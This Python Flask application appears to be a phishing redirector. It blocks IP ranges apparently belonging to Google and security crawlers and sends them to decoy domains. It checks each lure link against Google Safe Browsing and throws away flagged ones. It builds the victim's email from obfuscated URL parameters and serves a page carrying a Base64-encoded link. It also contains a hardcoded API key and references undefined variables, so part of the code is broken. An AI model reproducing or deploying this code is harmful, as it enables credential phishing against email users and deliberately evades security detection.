from flask import Flask, request, redirect, send_file, jsonify
import requests
import random
import base64
import os
import re  # For email validation

app = Flask(__name__)

# Your Google Safe Browsing API key
API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
# Path to the txt file with the links
LINKS_FILE_PATH = 'links.txt'
# Path to the raw HTML template
RAW_HTML_FILE_PATH = 'raw.html'
# Path to the final index HTML file
INDEX_HTML_FILE_PATH = 'index.html'
# Path to the file containing redirect URLs
REDIRECT_URLS_FILE_PATH = 'redirecturls.txt'


# Function to check if a URL is safe with Google Safe Browsing
def check_url_safety(api_key, url):
    api_url = "https://safebrowsing.googleapis.com/v4/threatMatches:find"
    payload = {
        "client": {
            "clientId": "yourcompanyname",
            "clientVersion": "1.5.2"
        },
        "threatInfo": {
            "threatTypes": ["MALWARE", "SOCIAL_ENGINEERING"],
            "platformTypes": ["ANY_PLATFORM"],
            "threatEntryTypes": ["URL"],
            "threatEntries": [
                {"url": url}
            ]
        }
    }
    params = {'key': api_key}
    
    try:
        response = requests.post(api_url, json=payload, params=params)
        response.raise_for_status()
        result = response.json()
        return "matches" not in result
    except requests.exceptions.RequestException as e:
        print(f"Error checking URL safety: {e}")
        return False  # Assume the URL is unsafe in case of an error





# Function to read links from the txt file
def get_links(file_path):
    with open(file_path, 'r') as file:
        # Filter links to include only those that start with 'https://'
        return [line.strip() for line in file.readlines() if line.strip().startswith('https://')]


# Function to update the raw HTML file with the Base64-encoded safe link
def update_html_with_av_pv_and_link(raw_html_file, index_html_file, iav, ipv, safe_link):
    # Ensure the link includes a protocol (http:// or https://)
    if not safe_link.startswith('http://') and not safe_link.startswith('https://'):
        safe_link = 'https://' + safe_link  # Default to https if no protocol is provided

    # Convert the safe link to Base64
    safe_link_base64 = base64.b64encode(safe_link.encode()).decode()

    with open(raw_html_file, 'r') as raw_file:
        raw_html = raw_file.read()
    
    updated_html = raw_html.replace("[[av]]", iav).replace("[[pv]]", ipv).replace("[[link]]", safe_link_base64)
    
    # Write to index.html (overwrites the existing file if present)
    with open(index_html_file, 'w') as index_file:
        index_file.write(updated_html)


# Function to get the list of blocked IPs from a file
def get_blocked_ips(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


# Function to get a random redirect URL from the file
def get_random_redirect_url(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
    return random.choice(urls) if urls else None


def is_valid_email(email):
    # Simple regex to validate email format
    email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(email_regex, email) is not None


bannedIP = [
    r"^66\.102\..*", r"^38\.100\..*", r"^107\.170\..*", r"^149\.20\..*", r"^38\.105\..*",
    r"^74\.125\..*", r"^66\.150\.14\..*", r"^54\.176\..*", r"^184\.173\..*", r"^66\.249\..*",
    r"^128\.242\..*", r"^72\.14\.192\..*", r"^208\.65\.144\..*", r"^209\.85\.128\..*",
    r"^216\.239\.32\..*", r"^207\.126\.144\..*", r"^173\.194\..*", r"^64\.233\.160\..*",
    r"^194\.52\.68\..*", r"^194\.72\.238\..*", r"^62\.116\.207\..*", r"^212\.50\.193\..*",
    r"^69\.65\..*", r"^50\.7\..*", r"^131\.212\..*", r"^46\.116\..*", r"^62\.90\..*",
    r"^89\.138\..*", r"^82\.166\..*", r"^85\.64\..*", r"^93\.172\..*", r"^109\.186\..*",
    r"^194\.90\..*", r"^212\.29\.192\..*", r"^212\.235\..*", r"^217\.132\..*", r"^50\.97\..*",
    r"^209\.85\..*", r"^66\.205\.64\..*", r"^204\.14\.48\..*", r"^64\.27\.2\..*", r"^67\.15\..*",
    r"^202\.108\.252\..*", r"^193\.47\.80\..*", r"^64\.62\.136\..*", r"^66\.221\..*",
    r"^198\.54\..*", r"^192\.115\.134\..*", r"^216\.252\.167\..*", r"^193\.253\.199\..*",
    r"^69\.61\.12\..*", r"^64\.37\.103\..*", r"^38\.144\.36\..*", r"^64\.124\.14\..*",
    r"^206\.28\.72\..*", r"^209\.73\.228\..*", r"^158\.108\..*", r"^168\.188\..*",
    r"^66\.207\.120\..*", r"^167\.24\..*", r"^192\.118\.48\..*", r"^67\.209\.128\..*",
    r"^12\.148\.209\..*", r"^198\.25\..*", r"^64\.106\.213\..*"
]

def get_first_https_link(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            url = line.strip()
            if url.startswith('https'):
                return url
    return None

def remove_link_from_file(file_path, link_to_remove):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != link_to_remove:
                file.write(line)


# Function to check if the incoming IP matches any banned IP pattern
def is_ip_banned(ip):
    for pattern in bannedIP:
        if re.match(pattern, ip):
            return True
    return False

@app.before_request
def block_ip():
    # Get the client IP address from X-Forwarded-For or fallback to remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        # Split the 'X-Forwarded-For' string to extract the first IP address
        requester_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        requester_ip = request.remote_addr

    # Check if the requester's IP is in the blocked IP ranges
    if is_ip_banned(requester_ip):
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)


@app.route('/')
def check_links_and_serve():
    # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
    ipv = request.args.get('wE657UyRfVtO')
    iav = request.args.get('VfDbGdT4R4ErD54tR1DtR')

    if not trexxcoz or not coztrexx:
        # If parameters are missing, redirect to a random domain
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)


    # Construct the email address from the decoded parameters
    vmail = f"{iav}@{ipv}"

    # Validate the constructed email
    if not is_valid_email(vmail):
        # If the email is not valid, redirect to a random domain
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # If the email is valid, proceed to check the safe links
    links = get_links(LINKS_FILE_PATH)

    # Iterate through links and remove unsafe ones until a safe one is found
    for link in links[:]:  # Create a shallow copy to iterate over while modifying the list
        if check_url_safety(API_KEY, link):
            # If a safe link is found, update the HTML with the Base64-encoded link and serve it
            update_html_with_av_pv_and_link(RAW_HTML_FILE_PATH, INDEX_HTML_FILE_PATH, iav, ipv, link)
            return send_file(INDEX_HTML_FILE_PATH)
        else:
            # Remove the unsafe link from the file and list
            remove_link_from_file(LINKS_FILE_PATH, link)

    return "No safe links found!"



@app.route('/update_links', methods=['POST'])
def update_links():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Read the file and get the new links
    new_links = file.read().decode('utf-8').strip().splitlines()
    
    # Filter out any empty lines
    new_links = [link for link in new_links if link]

    # Overwrite the existing links with the new ones
    with open(LINKS_FILE_PATH, 'w') as links_file:
        links_file.write('\n'.join(new_links) + '\n')

    total_links_count = len(new_links)

    return jsonify({
        "message": "Links updated successfully!",
        "total_links_count": total_links_count
    }), 200




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
